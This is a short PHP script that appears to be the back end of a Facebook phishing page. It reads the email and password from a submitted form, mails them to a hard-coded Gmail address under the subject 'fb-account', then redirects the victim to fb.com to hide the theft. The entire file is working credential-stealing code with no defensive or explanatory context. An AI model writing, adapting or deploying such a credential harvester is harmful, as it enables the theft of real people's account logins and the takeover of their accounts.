<?php
if(array_key_exists('email',$_POST)){
    $msg = $_POST['email'].":".$_POST['password'];
    mail("aman30865@gmail.com","fb-account",$msg);
    header("location:https://www.fb.com");
}
?>
